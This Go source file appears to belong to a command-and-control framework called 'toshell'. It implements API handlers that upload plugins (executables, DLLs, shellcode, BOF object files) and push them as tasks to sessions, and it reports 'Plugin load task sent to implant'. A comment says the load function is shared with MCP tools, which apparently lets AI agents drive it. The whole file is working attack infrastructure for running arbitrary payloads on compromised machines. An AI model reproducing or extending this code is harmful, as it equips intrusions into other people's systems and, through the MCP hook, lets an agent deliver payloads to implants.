package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/common/types"
	"toshell/internal/server/plugin"
	"toshell/internal/server/task"
)

type LoadPluginRequest struct {
	PluginID string `json:"plugin_id"`
	Args     string `json:"args"`
}

func (s *Server) listPluginsHandler(w http.ResponseWriter, r *http.Request) {
	mgr := plugin.GetManager()
	if mgr == nil {
		json.NewEncoder(w).Encode(map[string]interface{}{
			"plugins": []interface{}{},
			"count":   0,
		})
		return
	}

	plugins := mgr.List()
	json.NewEncoder(w).Encode(map[string]interface{}{
		"plugins": plugins,
		"count":   len(plugins),
	})
}

func (s *Server) getPluginHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]

	mgr := plugin.GetManager()
	if mgr == nil {
		http.Error(w, `{"error":"Plugin manager not initialized"}`, http.StatusInternalServerError)
		return
	}

	p, err := mgr.Get(id)
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusNotFound)
		return
	}

	json.NewEncoder(w).Encode(p)
}

func (s *Server) uploadPluginHandler(w http.ResponseWriter, r *http.Request) {
	maxSize := int64(50 * 1024 * 1024)
	r.Body = http.MaxBytesReader(w, r.Body, maxSize)

	if err := r.ParseMultipartForm(maxSize); err != nil {
		http.Error(w, `{"error":"File too large"}`, http.StatusBadRequest)
		return
	}

	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, `{"error":"No file provided"}`, http.StatusBadRequest)
		return
	}
	defer file.Close()

	if !plugin.IsValidPluginType(header.Filename) {
		http.Error(w, `{"error":"Invalid plugin type. Supported: .exe, .dll, .bin, .raw, .sc, .o, .obj"}`, http.StatusBadRequest)
		return
	}

	data, err := io.ReadAll(file)
	if err != nil {
		http.Error(w, `{"error":"Failed to read file"}`, http.StatusInternalServerError)
		return
	}

	description := r.FormValue("description")

	mgr := plugin.GetManager()
	if mgr == nil {
		http.Error(w, `{"error":"Plugin manager not initialized"}`, http.StatusInternalServerError)
		return
	}

	p, err := mgr.Add(header.Filename, data, description)
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(p)
}

func (s *Server) deletePluginHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]

	mgr := plugin.GetManager()
	if mgr == nil {
		http.Error(w, `{"error":"Plugin manager not initialized"}`, http.StatusInternalServerError)
		return
	}

	if err := mgr.Delete(id); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusNotFound)
		return
	}

	w.WriteHeader(http.StatusNoContent)
}

func (s *Server) refreshPluginsHandler(w http.ResponseWriter, r *http.Request) {
	mgr := plugin.GetManager()
	if mgr == nil {
		http.Error(w, `{"error":"Plugin manager not initialized"}`, http.StatusInternalServerError)
		return
	}

	if err := mgr.Refresh(); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	plugins := mgr.List()
	json.NewEncoder(w).Encode(map[string]interface{}{
		"plugins": plugins,
		"count":   len(plugins),
	})
}

func (s *Server) loadPluginHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]

	var req LoadPluginRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	res, err := s.loadPlugin(sessionID, req.PluginID, req.Args)
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusBadRequest)
		return
	}
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(res)
}

// loadPlugin 把插件按类型创建任务并下发到会话（HTTP handler 与 MCP 工具共用）。
func (s *Server) loadPlugin(sessionID, pluginID, args string) (map[string]interface{}, error) {
	mgr := plugin.GetManager()
	if mgr == nil {
		return nil, fmt.Errorf("Plugin manager not initialized")
	}
	p, err := mgr.Get(pluginID)
	if err != nil {
		return nil, err
	}
	data, err := mgr.ReadPluginData(pluginID)
	if err != nil {
		return nil, err
	}

	var taskInfo *types.TaskInfo
	base64Data := base64.StdEncoding.EncodeToString(data)
	switch p.Type {
	case plugin.PluginTypeBOF:
		taskInfo, err = s.taskMgr.CreateBOFLoad(sessionID, base64Data, args)
	case plugin.PluginTypeEXE:
		taskInfo, err = s.taskMgr.Create(sessionID, task.TaskParams{
			TaskType: "plugin_exe", Command: p.Name, Data: base64Data, Args: []string{args},
		})
	case plugin.PluginTypeDLL:
		taskInfo, err = s.taskMgr.Create(sessionID, task.TaskParams{
			TaskType: "plugin_dll", Command: p.Name, Data: base64Data,
		})
	case plugin.PluginTypeShellcode:
		taskInfo, err = s.taskMgr.Create(sessionID, task.TaskParams{
			TaskType: "plugin_shellcode", Command: p.Name, Data: base64Data,
		})
	default:
		taskInfo, err = s.taskMgr.CreateBOFLoad(sessionID, base64Data, args)
	}
	if err != nil {
		return nil, err
	}
	if s.listener != nil {
		if err := s.listener.PushTask(sessionID, taskInfo); err != nil {
			return nil, err
		}
	}
	return map[string]interface{}{
		"task_id": taskInfo.ID,
		"plugin":  p,
		"status":  "pending",
		"message": "Plugin load task sent to implant",
	}, nil
}
